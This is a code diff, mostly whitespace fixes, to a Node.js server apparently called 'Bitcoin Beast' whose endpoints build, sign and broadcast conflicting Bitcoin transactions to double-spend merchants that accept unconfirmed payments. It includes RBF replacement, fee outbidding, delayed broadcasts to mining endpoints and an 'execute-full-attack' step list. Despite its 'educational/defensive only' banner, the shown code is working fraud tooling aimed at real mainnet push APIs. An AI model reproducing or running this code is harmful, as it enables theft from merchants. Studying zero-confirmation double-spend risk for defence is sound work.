@@ -1,6 +1,5 @@
 require('dotenv').config();
 const express = require('express');
-const path = require('path');
 const bitcoin = require('bitcoinjs-lib');
 const ecc = require('tiny-secp256k1');
 const { BIP32Factory } = require('bip32');
@@ -30,14 +29,14 @@ const allowedOrigins = [
 
 // Add Render deployment URL if available
 if (process.env.RENDER_EXTERNAL_URL) {
-  allowedOrigins.push(process. env.RENDER_EXTERNAL_URL);
+  allowedOrigins.push(process.env.RENDER_EXTERNAL_URL);
 }
 
 app.use(cors({
   origin: (origin, callback) => {
     // Allow requests with no origin (like mobile apps or curl requests)
     if (!origin) return callback(null, true);
-    
+
     if (process.env.NODE_ENV === 'production') {
       if (allowedOrigins.includes(origin)) {
         callback(null, true);
@@ -45,7 +44,7 @@ app.use(cors({
         callback(new Error('CORS not allowed'));
       }
     } else {
-      // Development:  Allow all
+      // Development: Allow all
       callback(null, true);
     }
   },
@@ -62,10 +61,10 @@ app.get('/', (req, res) => {
   res.status(200).json({
     status: 'OK',
     message: 'Bitcoin Beast Backend is running 🚀',
-    version:  '1.0.0',
+    version: '1.0.0',
     endpoints: {
       api_docs: '/api-docs',
-      health:  '/health',
+      health: '/health',
       swagger_spec: '/swagger-spec.json',
     }
   });
@@ -85,13 +84,13 @@ const MEMPOOL_APIS = {
 // ======== SWAGGER DOCUMENTATION ========
 const getSwaggerSpec = () => {
   const baseUrl = process.env.NODE_ENV === 'production' && process.env.RENDER_EXTERNAL_URL
-    ? process. env.RENDER_EXTERNAL_URL
+    ? process.env.RENDER_EXTERNAL_URL
     : 'http://localhost:3000';
 
   return {
-    openapi:  '3.0.0',
+    openapi: '3.0.0',
     info: {
-      title:  'Bitcoin Beast Framework API',
+      title: 'Bitcoin Beast Framework API',
       version: '1.0.0',
       description: 'Testnet/mainnet double-spend testing, fee attack simulation, merchant 0-conf risk assessment.  For DEFENSIVE and EDUCATIONAL USE ONLY.',
       contact: { name: 'sweetpie2929' },
@@ -99,7 +98,7 @@ const getSwaggerSpec = () => {
     servers: [{ url: baseUrl, description: 'API Server' }],
     paths: {
       '/api/final-sequence-attack': { post: { summary: 'Simulate final-sequence and RBF attack', tags: ['Attacks'] }},
-      '/api/smart-fee-booster': { post: { summary:  'Fetch smart attack fee strategy', tags: ['Analysis'] }},
+      '/api/smart-fee-booster': { post: { summary: 'Fetch smart attack fee strategy', tags: ['Analysis'] }},
       '/api/merchant-targeted-broadcast': { post: { summary: 'Broadcast TX to merchant nodes', tags: ['Broadcast'] }},
       '/api/delayed-doublespend': { post: { summary: 'Schedule delayed double-spend', tags: ['Attacks'] }},
       '/api/identical-inputs-exploit': { post: { summary: 'Create conflicting TXs', tags: ['Attacks'] }},
@@ -109,7 +108,7 @@ const getSwaggerSpec = () => {
       '/api/wallet/add-address': { post: { summary: 'Add address to monitor', tags: ['Wallet'] }},
       '/api/wallet/balance': { get: { summary: 'Get wallet balance', tags: ['Wallet'] }},
       '/api/wallet/utxos': { get: { summary: 'Get UTXOs', tags: ['Wallet'] }},
-      '/api/wallet/mempool': { get: { summary:  'Get mempool transactions', tags: ['Wallet'] }},
+      '/api/wallet/mempool': { get: { summary: 'Get mempool transactions', tags: ['Wallet'] }},
       '/api/generate-wallet': { post: { summary: 'Generate new wallet', tags: ['Wallet'] }},
       '/api/create-opreturn-tx': { post: { summary: 'Create OP_RETURN transaction', tags: ['Transactions'] }},
     }
@@ -165,10 +164,10 @@ app.post('/api/final-sequence-attack', (req, res) => {
 
     // Defensive input validation
     if (!wif || !utxo || !victim_address || !attacker_address) {
-      return res.status(400).json({ error: 'Missing required fields:  wif, utxo, victim_address, attacker_address' });
+      return res.status(400).json({ error: 'Missing required fields: wif, utxo, victim_address, attacker_address' });
     }
     if (!validateWIF(wif, net)) {
-      return res. status(400).json({ error: 'Invalid WIF for network' });
+      return res.status(400).json({ error: 'Invalid WIF for network' });
     }
     if (!validateAddress(victim_address, net) || !validateAddress(attacker_address, net)) {
       return res.status(400).json({ error: 'Invalid address(es) for network' });
@@ -178,13 +177,13 @@ app.post('/api/final-sequence-attack', (req, res) => {
 
     // TX1 - appears non-RBF
     const tx1_fee = Math.ceil(150 * fee_rate);
-    const psbt1 = new bitcoin. Psbt({ network:  net })
+    const psbt1 = new bitcoin.Psbt({ network: net })
       .addInput({
         hash: utxo.txid,
         index: utxo.vout,
         sequence: 0xffffffff,
         witnessUtxo: {
-          script:  bitcoin.address.toOutputScript(victim_address, net),
+          script: bitcoin.address.toOutputScript(victim_address, net),
           value: utxo.value,
         },
       })
@@ -224,7 +223,7 @@ app.post('/api/final-sequence-attack', (req, res) => {
         destination: attacker_address,
         sequence: '0xfffffffe (RBF enabled)',
         fee: tx2_fee,
-        broadcast_target:  'mining_pools',
+        broadcast_target: 'mining_pools',
       },
       exploit_logic: [
         'Broadcast merchant TX with non-RBF sequence.',
@@ -232,8 +231,8 @@ app.post('/api/final-sequence-attack', (req, res) => {
         'Broadcast new TX (RBF), higher fee > wins mempool > miners confirm.',
         'TX1 appears in mempool but is replaced, so merchant cheated.',
       ],
-      merchant_belief:  'Payment received (TX1 in mempool)',
-      reality:  'TX2 confirms, TX1 orphaned.',
+      merchant_belief: 'Payment received (TX1 in mempool)',
+      reality: 'TX2 confirms, TX1 orphaned.',
     });
   } catch (error) {
     res.status(500).json({ error: error.message });
@@ -245,15 +244,15 @@ app.post('/api/smart-fee-booster', async (req, res) => {
   try {
     const { network = 'testnet', target_fee_rate = 50 } = req.body;
     const api = MEMPOOL_APIS[network];
-    
+
     const feeResponse = await axios.get(`${api}/v1/fees/recommended`, { timeout: 5000 });
     const fees = feeResponse.data;
     const current_fees = {
       fastest: fees.fastestFee,
       half_hour: fees.halfHourFee,
-      hour: fees. hourFee,
+      hour: fees.hourFee,
     };
-    const smart_fee = Math.max(current_fees. fastest * 1.2, target_fee_rate);
+    const smart_fee = Math.max(current_fees.fastest * 1.2, target_fee_rate);
 
     res.json({
       attack_type: 'SMART_FEE_BOOSTER',
@@ -262,16 +261,16 @@ app.post('/api/smart-fee-booster', async (req, res) => {
       boost_strategy: {
         before_attack: 'Observe mempool for network fee trends',
         suggested_merchant_fee: Math.ceil(smart_fee),
-        attacker_outbids_with:  Math.ceil(smart_fee * 1.5),
+        attacker_outbids_with: Math.ceil(smart_fee * 1.5),
       },
       merchant_psychology: {
-        sees_fee:  Math.ceil(smart_fee),
-        thinks:  'Fee-rate is typical given network congestion',
+        sees_fee: Math.ceil(smart_fee),
+        thinks: 'Fee-rate is typical given network congestion',
         likely_accepts: true,
       },
       miner_incentive: {
         attacker_fee: Math.ceil(smart_fee * 1.5),
-        effect:  'Miner will likely prefer attacker TX.',
+        effect: 'Miner will likely prefer attacker TX.',
       },
     });
   } catch (error) {
@@ -298,14 +297,14 @@ app.post('/api/merchant-targeted-broadcast', async (req, res) => {
         'https://api.blockchair.com/bitcoin/push/transaction',
       ],
     };
-    const targets = merchant_nodes.length ?  merchant_nodes : default_nodes[network] || default_nodes['testnet'];
+    const targets = merchant_nodes.length ? merchant_nodes : default_nodes[network] || default_nodes['testnet'];
     const results = [];
 
     for (const endpoint of targets) {
       try {
-        const response = await axios. post(endpoint, hex, {
+        const response = await axios.post(endpoint, hex, {
           headers: { 'Content-Type': 'text/plain' },
-          timeout:  4000,
+          timeout: 4000,
         });
         results.push({ endpoint, txid: response.data, status: 'BROADCASTED', time: Date.now() });
       } catch (e) {
@@ -319,7 +318,7 @@ app.post('/api/merchant-targeted-broadcast', async (req, res) => {
       broadcast_results: results,
       broadcast_settings: {
         delay_ms: 500,
-        detail:  'Deliberately deliver to merchant-facing explorers before mining pools.',
+        detail: 'Deliberately deliver to merchant-facing explorers before mining pools.',
       }
     });
   } catch (error) {
@@ -342,7 +341,7 @@ app.post('/api/delayed-doublespend', async (req, res) => {
         'https://api.blockchair.com/bitcoin/push/transaction',
       ]
     };
-    const targets = miner_endpoints.length ?  miner_endpoints : mining_endpoints[network];
+    const targets = miner_endpoints.length ? miner_endpoints : mining_endpoints[network];
     const delay = merchant_timeout_ms + crypto.randomInt(3000, 8000);
 
     setTimeout(async () => {
@@ -352,13 +351,13 @@ app.post('/api/delayed-doublespend', async (req, res) => {
             headers: { 'Content-Type': 'text/plain' },
             timeout: 3000,
           });
-        } catch {/* silence */}
+        } catch { /* silence */ }
       }
     }, delay);
 
     res.json({
       attack_type: 'DELAYED_DOUBLESPEND',
-      scheduled:  {
+      scheduled: {
         delay_ms: delay,
         trigger_time: new Date(Date.now() + delay).toISOString(),
         targets,
@@ -403,7 +402,7 @@ app.post('/api/identical-inputs-exploit', (req, res) => {
           index: utxo.vout,
           sequence: 0xffffffff,
           witnessUtxo: {
-            script:  bitcoin.address.toOutputScript(merchant_address, net),
+            script: bitcoin.address.toOutputScript(merchant_address, net),
             value: utxo.value,
           }
         })
@@ -412,30 +411,38 @@ app.post('/api/identical-inputs-exploit', (req, res) => {
       const tx1 = psbt1.extractTransaction();
 
       // TX to attacker (RBF)
-      const psbt2 = new bitcoin. Psbt({ network: net })
+      const psbt2 = new bitcoin.Psbt({ network: net })
         .addInput({
           hash: utxo.txid,
-          index: utxo. vout,
+          index: utxo.vout,
           sequence: 0xfffffffe,
           witnessUtxo: {
             script: bitcoin.address.toOutputScript(attacker_address, net),
             value: utxo.value,
           }
         })
-        .addOutput({ address: attacker_address, value:  utxo.value - 5000 });
+        .addOutput({ address: attacker_address, value: utxo.value - 5000 });
       psbt2.signInput(0, keyPair).finalizeAllInputs();
       const tx2 = psbt2.extractTransaction();
 
       transactions.push({
         utxo_index: utxo_idx,
         inputs: {
-          shared_txid: utxo.txid, shared_vout: utxo.vout, shared_value: utxo.value
+          shared_txid: utxo.txid,
+          shared_vout: utxo.vout,
+          shared_value: utxo.value
         },
         tx_merchant: {
-          txid: tx1.getId(), hex: tx1.toHex(), output: merchant_address, fee: 3000
+          txid: tx1.getId(),
+          hex: tx1.toHex(),
+          output: merchant_address,
+          fee: 3000
         },
         tx_attacker: {
-          txid: tx2.getId(), hex: tx2.toHex(), output: attacker_address, fee: 5000
+          txid: tx2.getId(),
+          hex: tx2.toHex(),
+          output: attacker_address,
+          fee: 5000
         }
       });
     });
@@ -443,7 +450,7 @@ app.post('/api/identical-inputs-exploit', (req, res) => {
     res.json({
       attack_type: 'IDENTICAL_INPUTS_EXPLOIT',
       tx_pairs: transactions,
-      result: 'Only one transaction can confirm.  Higher-fee TX (to attacker) will win if miners use RBF.',
+      result: 'Only one transaction can confirm. Higher-fee TX (to attacker) will win if miners use RBF.',
     });
   } catch (error) {
     res.status(500).json({ error: error.message });
@@ -550,7 +557,7 @@ app.post('/api/execute-full-attack', async (req, res) => {
       })
       .addOutput({
         address: merchant_address,
-        value: utxo. value - 3000,
+        value: utxo.value - 3000,
       });
     psbt1.signInput(0, keyPair).finalizeAllInputs();
     const tx1 = psbt1.extractTransaction();
@@ -558,10 +565,10 @@ app.post('/api/execute-full-attack', async (req, res) => {
     // Attacker TX
     const psbt2 = new bitcoin.Psbt({ network: net })
       .addInput({
-        hash: utxo. txid,
+        hash: utxo.txid,
         index: utxo.vout,
         sequence: 0xfffffffe,
-        witnessUtxo:  {
+        witnessUtxo: {
           script: bitcoin.address.toOutputScript(attacker_address, net),
           value: utxo.value,
         },
@@ -587,7 +594,7 @@ app.post('/api/execute-full-attack', async (req, res) => {
         'Step 4: After window, broadcast TX2 (to miners).',
         'Step 5: Monitor for double-spend confirmation.',
       ],
-      expected:  'Attack will succeed if merchant ships on trust of 0-conf.',
+      expected: 'Attack will succeed if merchant ships on trust of 0-conf.',
       caveats: [
         'Fails if merchant waits for confirmation.',
         'Merchant watches for conflicts (defensive setup).'
@@ -636,7 +643,7 @@ app.use((req, res) => {
 // Global error handler
 app.use((err, req, res, next) => {
   console.error('❌ Unhandled Error:', err);
-  
+
   const errorResponse = {
     error: process.env.NODE_ENV === 'production'
       ? 'Internal server error'
@@ -646,7 +653,7 @@ app.use((err, req, res, next) => {
   };
 
   // Only include stack trace in development
-  if (process.env. NODE_ENV !== 'production') {
+  if (process.env.NODE_ENV !== 'production') {
     errorResponse.stack = err.stack;
   }
 
@@ -654,7 +661,7 @@ app.use((err, req, res, next) => {
 });
 
 // ===== SERVER INITIALIZATION =====
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 const NODE_ENV = process.env.NODE_ENV || 'development';
 
 const server = app.listen(PORT, () => {
@@ -663,11 +670,11 @@ const server = app.listen(PORT, () => {
 ║                                                            ║
 ║  🚧 Bitcoin Beast Payment Framework                       ║
 ║                                                            ║
-║  ✓ Server running on port ${PORT}                           ║
-║  ✓ Environment: ${NODE_ENV. toUpperCase()}                          ║
-║  ✓ Root:  http://localhost:${PORT}                            ║
-║  ✓ API Docs: http://localhost:${PORT}/api-docs              ║
-║  ✓ Health:  http://localhost:${PORT}/health                   ║
+║  ✓ Server running on port ${PORT}                          ║
+║  ✓ Environment: ${NODE_ENV.toUpperCase()}                  ║
+║  ✓ Root:  http://localhost:${PORT}                         ║
+║  ✓ API Docs: http://localhost:${PORT}/api-docs             ║
+║  ✓ Health:  http://localhost:${PORT}/health                ║
 ║                                                            ║
 ║  ⚠️  FOR EDUCATIONAL/DEFENSIVE USE ONLY                    ║
 ║  ⚠️  DO NOT ATTACK UNAUTHORIZED PARTIES                    ║
